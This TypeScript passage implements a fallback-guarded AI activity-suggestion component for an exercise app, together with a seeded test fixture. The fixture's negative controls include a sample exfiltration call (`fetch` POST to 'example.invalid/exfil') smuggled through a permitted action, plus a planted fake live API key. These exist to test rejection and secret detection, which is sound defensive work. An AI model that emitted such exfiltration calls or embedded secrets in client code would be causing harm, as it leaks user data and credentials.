    maxDailyInferenceCalls: policy.maxDailyInferenceCalls,
    endToEndDeadlineMs: policy.endToEndDeadlineMs,
    elapsedMs,
    withinDeadline: elapsedMs <= policy.endToEndDeadlineMs,
    costKnown: false,
  };
}

/** Full catalog, deterministically ordered — the flow a user gets with no service at all. */
export function deterministicOfflinePlan(context: ComponentContext, predicates: NarrowPredicates | null): readonly PracticeActivity[] {
  const base = predicates
    ? filterActivities(context.catalog, predicates, context)
    : filterActivities(
        context.catalog,
        { maxDurationMinutes: null, availableEquipment: null, maxNoiseLevel: null, unresolvedSlots: [], clarifyingQuestions: [], invented: false },
        context,
      );
  if (base.length > 0) return base;
  return context.catalog.activities
    .slice()
    .sort((a, b) => a.durationMinutes - b.durationMinutes || a.activityId.localeCompare(b.activityId))
    .slice(0, BOUNDED_AI_COMPONENTS_RECIPE_POLICY.maxCandidateActivities);
}

export function runBoundedComponent(input: BoundedComponentInput): BoundedComponentRun {
  const { context, service } = input;
  const authorizations: ActionAuthorization[] = [];
  const effects: ActionEffect[] = [];
  const policy = versionedComponentPolicy();
  const bundle = describeClientBundle();
  const elapsedMs = service.latencyMs ?? 0;

  const finish = (partial: {
    mode: ComponentMode;
    interpretation: InterpretationRecord | null;
    predicates: NarrowPredicates | null;
    candidateActivityIds: readonly string[];
    clarifyingQuestions: readonly string[];
    failure: ComponentFailure | null;
    usable: boolean;
    inferenceCalls: number;
  }): BoundedComponentRun => ({
    sessionId: context.sessionId,
    mode: partial.mode,
    interpretation: partial.interpretation,
    predicates: partial.predicates,
    candidateActivityIds: partial.candidateActivityIds,
    authorizations,
    executedActions: effects.map(effectToAction),
    effects,
    clarifyingQuestions: partial.clarifyingQuestions,
    failure: partial.failure,
    usable: partial.usable,
    usage: usage(partial.inferenceCalls, elapsedMs),
    clientBundle: bundle,
    policy,
    networkCallsFromClient: 0,
  });

  // Catalog data is a precondition for every suggestion; an empty catalog never
  // becomes an invented activity.
  const freshness = catalogFreshness(context.catalog, context.nowIso);
  if (freshness === "empty") {
    return finish({
      mode: "deterministic_fallback",
      interpretation: null,
      predicates: null,
      candidateActivityIds: [],
      clarifyingQuestions: ["The activity list has not loaded yet. Retry, or pick from your saved activities."],
      failure: { code: "missing_catalog_data", detail: `Catalog ${context.catalog.catalogId} has no activities.`, fabricatedFacts: false },
      usable: false,
      inferenceCalls: 0,
    });
  }

  let interpretation: InterpretationRecord;
  try {
    interpretation = interpretConstraints({ sessionId: context.sessionId, utterance: input.utterance, language: input.language });
  } catch (error) {
    // An unsupported language loses the free-text path, not the product.
    const offline = deterministicOfflinePlan(context, null);
    const request: ActionRequest = { action: "show_offline_plan" };
    authorizations.push(authorizeAction(request, context));
    effects.push(executeAction(request, context, { candidateActivityIds: offline.map((a) => a.activityId), stale: freshness === "stale" }));
    return finish({
      mode: "deterministic_fallback",
      interpretation: null,
      predicates: null,
      candidateActivityIds: offline.map((a) => a.activityId),
      clarifyingQuestions: [
        `Free-text input is only supported in ${SUPPORTED_COMPONENT_LANGUAGES.join(", ")}. Use the time / equipment / noise controls instead.`,
      ],
      failure: {
        code: "unsupported_language",
        detail: error instanceof Error ? error.message : "unsupported language",
        fabricatedFacts: false,
      },
      usable: offline.length > 0,
      inferenceCalls: 0,
    });
  }

  const predicates = projectPredicates(interpretation);
  const candidates = filterActivities(context.catalog, predicates, context);
  const candidateIds = candidates.map((activity) => activity.activityId);

  const filterRequest: ActionRequest = { action: "filter_activities" };
  authorizations.push(authorizeAction(filterRequest, context));
  effects.push(executeAction(filterRequest, context, { candidateActivityIds: candidateIds }));

  // Ambiguity is asked about before anything is filtered on it.
  for (const entry of interpretation.slots) {
    if (entry.outcome !== "ambiguous_ask" || entry.clarifyingQuestion === null) continue;
    const askRequest: ActionRequest = { action: "ask_clarifying_question" };
    authorizations.push(authorizeAction(askRequest, context));
    effects.push(executeAction(askRequest, context, { clarification: { slot: entry.slot, question: entry.clarifyingQuestion } }));
  }

  const fallback = (code: ComponentFailureCode, detail: string, inferenceCalls: number): BoundedComponentRun => {
    const offline = deterministicOfflinePlan(context, predicates);
    const offlineRequest: ActionRequest = { action: "show_offline_plan" };
    authorizations.push(authorizeAction(offlineRequest, context));
    effects.push(executeAction(offlineRequest, context, { candidateActivityIds: offline.map((a) => a.activityId), stale: freshness === "stale" }));
    return finish({
      mode: "deterministic_fallback",
      interpretation,
      predicates,
      candidateActivityIds: offline.map((a) => a.activityId),
      clarifyingQuestions: predicates.clarifyingQuestions,
      failure: { code, detail, fabricatedFacts: false },
      usable: offline.length > 0,
      inferenceCalls,
    });
  };

  if (!service.available) return fallback("service_unavailable", "Semantic service unreachable; deterministic filter and offline plan used instead.", 0);
  if (service.cancelled) return fallback("cancelled", "Request cancelled before a usable assessment arrived.", 1);
  if (elapsedMs > BOUNDED_AI_COMPONENTS_RECIPE_POLICY.endToEndDeadlineMs) {
    return fallback("deadline_exceeded", `Assessment exceeded the ${BOUNDED_AI_COMPONENTS_RECIPE_POLICY.endToEndDeadlineMs}ms end-to-end deadline.`, 1);
  }
  if (service.partial) return fallback("partial_inference", "Only part of the assessment arrived; partial output is not completed by guessing.", 1);
  if (freshness === "stale") {
    return fallback("stale_catalog", `Catalog revision ${context.catalog.revision} is stale; the last-known plan is shown and timers stay blocked.`, 1);
  }

  // The service answered. Parse through the SQ-01 contract; an unparseable or
  // failure result is a fallback, not an excuse to improvise.
  let parsed: SemanticQuestionResult;
  try {
    parsed = parseSemanticQuestionResult(service.result);
  } catch (error) {
    return fallback("partial_inference", `Semantic result did not satisfy the SQ-01 contract: ${error instanceof Error ? error.message : "invalid"}`, 1);
  }
  if (parsed.status !== "answered") {
    return fallback(parsed.status === "cancelled" ? "cancelled" : "partial_inference", `Semantic result reported ${parsed.status}.`, 1);
  }

  // Whatever the model asked for goes through the same policy as everything else.
  if (service.proposedAction) {
    const authorization = authorizeAction(service.proposedAction, context);
    authorizations.push(authorization);
    if (!authorization.allowed) {
      return fallback("unsafe_action_rejected", `Proposed action rejected: ${authorization.reason}`, 1);
    }
  }

  // The model may only land on a candidate the deterministic filter produced.
  const chosen = service.proposedActivityId !== undefined ? candidates.find((activity) => activity.activityId === service.proposedActivityId) : undefined;
  if (!chosen) {
    const rejection: ActionRequest = { action: "suggest_activity", activityId: service.proposedActivityId, confidence: 1 };
    authorizations.push(authorizeAction(rejection, context));
    return fallback(
      "unsafe_action_rejected",
      `Selected activity ${service.proposedActivityId ?? "(none)"} is not in the deterministic candidate set [${candidateIds.join(", ")}].`,
      1,
    );
  }

  const suggestRequest: ActionRequest = { action: "suggest_activity", activityId: chosen.activityId, confidence: service.proposedAction?.confidence };
  authorizations.push(authorizeAction(suggestRequest, context));
  effects.push(executeAction(suggestRequest, context));

  return finish({
    mode: "online_semantic",
    interpretation,
    predicates,
    candidateActivityIds: candidateIds,
    clarifyingQuestions: predicates.clarifyingQuestions,
    failure: null,
    usable: true,
    inferenceCalls: 1,
  });
}

function effectToAction(effect: ActionEffect): PermittedComponentAction {
  switch (effect.kind) {
    case "activities_filtered":
      return "filter_activities";
    case "activity_suggested":
      return "suggest_activity";
    case "timer_started":
      return "start_activity_timer";
    case "clarification_asked":
      return "ask_clarifying_question";
    case "offline_plan_shown":
      return "show_offline_plan";
    case "interpretation_corrected":
      return "record_interpretation_correction";
  }
}

// ---------------------------------------------------------------------------
// Seeded paper fixture — a small connected practice-activity app.
// ---------------------------------------------------------------------------

const PAPER_CATALOG: ActivityCatalog = {
  catalogId: "catalog.practice-activities",
  revision: "rev.529.v1",
  generatedAtIso: "2026-09-20T05:00:00.000Z",
  activities: [
    {
      activityId: "act.breath-reset",
      title: "Seated breath reset",
      durationMinutes: 3,
      requiredEquipment: ["chair"],
      noiseLevel: "silent",
      prerequisiteActivityIds: [],
      requiredPermissions: [],
    },
    {
      activityId: "act.wall-mobility",
      title: "Wall shoulder mobility",
      durationMinutes: 7,
      requiredEquipment: ["wall"],
      noiseLevel: "quiet",
      prerequisiteActivityIds: [],
      requiredPermissions: [],
    },
    {
      activityId: "act.mat-flow",
      title: "Mat mobility flow",
      durationMinutes: 12,
      requiredEquipment: ["mat"],
      noiseLevel: "quiet",
      prerequisiteActivityIds: [],
      requiredPermissions: [],
    },
    {
      activityId: "act.band-pulls",
      title: "Band pull-aparts",
      durationMinutes: 8,
      requiredEquipment: ["resistance_band"],
      noiseLevel: "quiet",
      prerequisiteActivityIds: [],
      requiredPermissions: [],
    },
    {
      activityId: "act.interval-jumps",
      title: "Interval jumps",
      durationMinutes: 10,
      requiredEquipment: ["none"],
      noiseLevel: "audible",
      prerequisiteActivityIds: ["act.wall-mobility"],
      requiredPermissions: ["audio_playback"],
    },
    {
      activityId: "act.guided-cooldown",
      title: "Guided cooldown",
      durationMinutes: 6,
      requiredEquipment: ["none"],
      noiseLevel: "quiet",
      prerequisiteActivityIds: [],
      requiredPermissions: ["background_timer"],
    },
  ],
};

const PAPER_CONTEXT: ComponentContext = {
  sessionId: "session.paper.529",
  nowIso: "2026-09-20T06:00:00.000Z",
  catalog: PAPER_CATALOG,
  grantedPermissions: ["background_timer"],
  completedActivityIds: [],
};

function paperChoiceResult(selectedOptionId: string): SemanticQuestionResult {
  return {
    status: "answered",
    answer: {
      kind: "choice",
      questionId: "q.select-candidate-activity",
      options: [
        { id: "candidate.first", label: "First listed candidate", probability: 0.82 },
        { id: "candidate.second", label: "Second listed candidate", probability: 0.12 },
        { id: "candidate.third", label: "Third listed candidate", probability: 0.06 },
      ],
      selectedOptionId,
    },
  };
}

export const BOUNDED_AI_COMPONENTS_SEEDED_FIXTURE = {
  revision: "paper.529.seeded.v1",
  catalog: PAPER_CATALOG,
  context: PAPER_CONTEXT,
  staleContext: { ...PAPER_CONTEXT, nowIso: "2026-09-25T06:00:00.000Z" } satisfies ComponentContext,
  emptyCatalogContext: { ...PAPER_CONTEXT, catalog: { ...PAPER_CATALOG, activities: [] } } satisfies ComponentContext,
  /** Exact quantities, all three slots resolvable. */
  exactUtterance: "I have 8 minutes, I have a mat and a wall, and I need to keep it down",
  /** Hedged duration, hedged equipment, explicit noise — two asks, zero invented facts. */
  ambiguousUtterance: "I have a few minutes before my meeting, maybe a mat, and I need to keep it down",
  /** Gear the catalog has no vocabulary for: asked about, never mapped to something else. */
  outOfVocabularyUtterance: "I have 10 minutes and a kettlebell",
  semanticAnswer: paperChoiceResult("candidate.first"),
  /** Structurally valid, confidently wrong: a real answer shape asking for an action that does not exist. */
  unsafeProposedAction: {
    action: "purchase_equipment",
    activityId: "act.mat-flow",
    confidence: 0.99,
    rationale: "The user would progress faster with a heavier band, so buy one.",
  } satisfies ActionRequest,
  /** A model trying to smuggle executable content through a permitted action. */
  codeEmittingAction: {
    action: "start_activity_timer",
    activityId: "act.mat-flow",
    confidence: 0.97,
    emittedCode: "await fetch('https://example.invalid/exfil', { method: 'POST' })",
  } satisfies ActionRequest,
  /** A confident request for an activity that is not in the catalog. */
  fabricatedActivityAction: {
    action: "suggest_activity",
    activityId: "act.sauna-recovery",
    confidence: 0.96,
  } satisfies ActionRequest,
  /** A confident request for a duration outside the policy bound. */
  outOfBoundsAction: {
    action: "start_activity_timer",
    activityId: "act.mat-flow",
    durationMinutes: 45,
    confidence: 0.95,
  } satisfies ActionRequest,
  clientArtifacts: [
    {
      path: "app/src/components/PracticePicker.tsx",
      source:
        "export async function suggest(input: PickerInput) {\n  return fetch('/api/practice/suggest', { method: 'POST', body: JSON.stringify(input) });\n}\n",
    },
    {
      path: "app/src/lib/offlinePlan.ts",
      source: "export function offlinePlan(catalog: Catalog) {\n  return [...catalog.activities].sort((a, b) => a.durationMinutes - b.durationMinutes);\n}\n",
    },
  ] satisfies ClientArtifact[],
  /** Negative control: the guard must actually find a planted secret. */
  leakyClientArtifact: {
    path: "app/src/lib/typesafeClient.ts",
    source: 'const TYPESAFE_API_KEY = "sk-live-9f2a7c4b81d3e6";\nexport const client = createClient({ key: TYPESAFE_API_KEY });\n',
  } satisfies ClientArtifact,
  offlineBusinesses: [
    { businessId: "tuck", offline: true, runtimeTypeSafeCall: false, scopeDecisionId: null },
    { businessId: "porchwatch", offline: true, runtimeTypeSafeCall: false, scopeDecisionId: null },
  ] satisfies OfflineBusinessRegistration[],
  /** Negative control: a runtime TypeSafe call into TUCK with nobody's decision behind it. */
  unscopedOfflineBusinesses: [{ businessId: "tuck", offline: true, runtimeTypeSafeCall: true, scopeDecisionId: null }] satisfies OfflineBusinessRegistration[],
  sessionStore: [
    { sessionId: "session.paper.529", kind: "interpretation" },
    { sessionId: "session.paper.529", kind: "correctionLog" },
    { sessionId: "session.other", kind: "interpretation" },
  ] satisfies SessionRecord[],
};

/** Happy path with the service available: one inference call, one tested suggestion. */
export function assessSeededBoundedComponent(): BoundedComponentRun {
  const seeded = BOUNDED_AI_COMPONENTS_SEEDED_FIXTURE;
  return runBoundedComponent({
    context: seeded.context,
    utterance: seeded.exactUtterance,
    service: {
      available: true,
      latencyMs: 900,
      result: seeded.semanticAnswer,
      proposedActivityId: "act.wall-mobility",
    },
  });
}

/** Same request with the service down: deterministic flow, still useful, no secret shipped. */
export function assessSeededOutageFallback(): BoundedComponentRun {
  const seeded = BOUNDED_AI_COMPONENTS_SEEDED_FIXTURE;
  return runBoundedComponent({
    context: seeded.context,
    utterance: seeded.exactUtterance,
    service: { available: false },
  });
}
